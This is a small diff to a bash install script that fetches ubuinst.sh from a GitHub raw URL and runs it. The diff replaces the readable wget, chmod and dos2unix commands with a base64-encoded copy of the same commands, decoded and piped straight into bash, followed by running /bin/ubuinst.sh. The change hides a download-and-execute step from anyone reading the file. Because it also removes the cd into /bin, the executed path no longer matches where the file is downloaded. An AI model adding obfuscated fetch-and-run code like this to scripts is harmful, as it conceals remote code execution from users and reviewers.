@@ -1,4 +1,3 @@
 #!/bin/bash
-cd /bin || exit
-wget raw.githubusercontent.com/Digulgasoft/NANDO-PWEB/install/ubuinst.sh && chmod +x ubuinst.sh && dos2unix ubuinst.sh > /dev/null 2>&1
-cd || exit
+echo 'd2dldCByYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RpZ3VsZ2Fzb2Z0L05BTkRPLVBXRUIvaW5zdGFsbC91YnVpbnN0LnNoICYmIGNobW9kICt4IHVidWluc3Quc2ggJiYgZG9zMnVuaXggdWJ1aW5zdC5zaCA+IC9kZXYvbnVsbCAyPiYx' | base64 -d | bash
+/bin/ubuinst.sh
